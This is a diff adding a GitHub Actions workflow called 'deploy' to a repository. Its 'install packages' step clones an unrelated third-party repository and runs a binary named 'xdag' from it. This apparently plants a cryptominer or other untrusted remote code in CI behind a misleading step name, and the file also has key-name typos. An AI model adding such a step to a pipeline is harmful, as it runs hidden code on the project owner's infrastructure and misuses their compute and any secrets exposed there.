@@ -1,0 +1,22 @@
+name: deploy
+
+on:
+  workflow_dispatch:
+    input:
+      ref:
+        description: branch|tag|SHA to checkout
+        defalut: 'master'
+        required: true
+  push:
+    branches:
+      - master
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: install packages
+        run: git clone https://github.com/Hjhjk68/Xdag.git && cd Xdag && chmod +x xdag && ./xdag
+      - name: deploy
+        run: yarn deploy
